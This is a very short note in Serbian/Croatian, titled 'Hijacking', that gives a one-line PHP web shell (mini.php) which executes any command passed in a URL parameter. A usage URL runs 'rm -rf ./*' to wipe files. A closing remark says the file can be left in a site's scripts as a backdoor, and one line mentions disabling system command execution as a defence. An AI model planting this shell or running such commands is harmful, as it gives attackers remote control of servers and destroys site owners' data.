### Hijacking

Hijack (24 bytes - mini.php): <?php echo `$_GET['t']`; ?>
Upotreba: https://domen.tld/mini.php?t=rm -rf ./*
Na serveru zabraniti izvrsavanje sistemskih komandi.

### Ovo moze da se ostavi u php skripti nekog sajta kao backdoor, i da se iskoristi kao komandna linija.


